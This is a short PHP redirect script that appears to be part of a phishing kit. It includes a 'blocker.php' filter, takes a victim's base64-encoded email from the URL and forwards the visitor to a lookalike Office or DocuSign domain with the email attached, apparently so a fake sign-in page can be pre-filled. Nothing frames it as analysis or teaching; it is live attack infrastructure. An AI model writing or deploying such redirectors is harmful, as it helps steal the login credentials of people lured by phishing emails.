<?php
session_start();

header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; connect-src 'self'; form-action 'self'; frame-ancestors 'none';");
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains; preload");
header("Referrer-Policy: no-referrer");

require 'blocker.php';

error_reporting(E_ALL);
ini_set('display_errors', 1);

if (!isset($_GET['email'])) {
    die('Email parameter is missing.');
}

$base64_email = $_GET['email'];

$email = base64_decode($base64_email, true);
if ($email === false && $base64_email !== base64_encode($email)) {
    die('Invalid Base64 encoded email.');
}

$final_url = 'https://office.supportdocusolution.online/dTFoweLa#' . $base64_email;

if (ob_get_length()) {
    ob_end_clean();
}

header("Location: " . $final_url);
exit;
?>
